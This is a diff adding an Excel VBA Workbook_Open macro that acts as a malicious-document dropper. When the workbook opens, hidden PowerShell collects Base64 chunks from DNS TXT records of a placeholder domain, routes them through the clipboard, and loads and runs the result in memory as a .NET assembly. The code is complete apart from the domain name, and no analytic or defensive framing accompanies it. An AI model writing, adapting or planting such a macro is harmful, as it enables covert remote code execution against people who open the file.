@@ -1,0 +1,30 @@
+Private Sub Workbook_Open()
+    Dim command As String
+    Dim wsh As Object
+    Dim arg1 As String
+    Dim Result_clipboard As String
+    Dim Result_output As Variant
+
+    arg = "'$numdomain=19;For($i=0;$i -lt $numdomain;$i++){$temp=(nslookup -q=TXT $i'" & "'[DOMAIN_NAME]'" & "')[-1];$result=$result+$temp}Write-Host $result'"
+    PScommand = "powershell.exe -command "
+    subcommand = "powershell.exe " & arg
+    Set wsh = CreateObject("WScript.Shell")
+    
+    
+    wsh.Run ("cmd.exe /c " & PScommand & subcommand) & "|clip", 0, True
+    With CreateObject("New:{1C3B4210-F441-11CE-B9EA-00AA006B1A69}")
+        .GetFromClipboard
+        Result_clipboard = .GetText
+    End With
+    Result_clipboard = Replace(Result_clipboard, Chr$(9), vbNullString)
+    Result_clipboard = Replace(Result_clipboard, Chr(34), vbNullString)
+    Result_clipboard = Replace(Result_clipboard, vbNewLine, vbNullString)
+    Result_clipboard = Replace(Result_clipboard, vbCrLf, vbNullString)
+    Result_clipboard = Replace(Result_clipboard, " ", "")
+    'Result_clipboard = """" & Result_clipboard & """"
+    'PScommand2 = "powershell.exe -command $bytes=[System.Convert]::FromBase64String('" & Result_clipboard & "')"
+    PScommand2 = "powershell.exe -command $b64='" & Result_clipboard & "';Write-Host $b64;$bytes=[System.Convert]::FromBase64String($b64);$assembly=[System.Reflection.Assembly]::Load($bytes);$assembly.EntryPoint.Invoke($null,$null)"
+    wsh.Run ("cmd.exe /k " & PScommand2)
+    'Debug.Print Result_clipboard;
+    'MsgBox "The program has finished" 
+End Sub
